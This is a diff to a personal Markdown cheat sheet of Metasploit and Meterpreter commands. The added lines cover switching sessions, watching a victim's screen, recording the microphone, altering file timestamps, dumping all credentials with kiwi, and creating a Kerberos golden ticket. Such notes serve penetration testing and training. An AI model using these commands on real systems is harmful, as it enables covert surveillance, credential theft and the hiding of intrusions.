@@ -2,7 +2,7 @@
 tags: [Tips]
 title: MSF_Tips
 created: '2020-05-04T19:21:28.632Z'
-modified: '2020-05-10T16:22:01.364Z'
+modified: '2020-05-16T14:30:24.319Z'
 ---
 
 # Metasploit Framework Tips
@@ -103,6 +103,12 @@ List all the sessions open:
 sessions
 ```
 
+Access an open session:
+
+```
+sessions <session-number>
+```
+
 ---
 
 ## Commands useful for Meterpreter console
@@ -155,6 +161,24 @@ Command to spawn a normal system shell:
 shell
 ```
 
+Watch the remote machine screen in real time:
+
+```
+screenshare
+```
+
+Record microphone:
+
+```
+record_mic
+```
+
+Modify timestamp of files in the system:
+
+```
+timestomp
+```
+
 ----
 
 ## Useful Meterpreter commands for Windows targets
@@ -164,6 +188,20 @@ Load mimikatz (latest versions is called **kiwi** in Metasploit Framework):
 ```
 load kiwi
 ```
+
+Gather all the credentials in the machine:
+
+```
+creds_all
+```
+
+Create a Kerberos Golden Ticket:
+
+```
+golden_ticket_create
+```
+
+---
 
 Enable Remote Desktop Protocol (RDP):
 
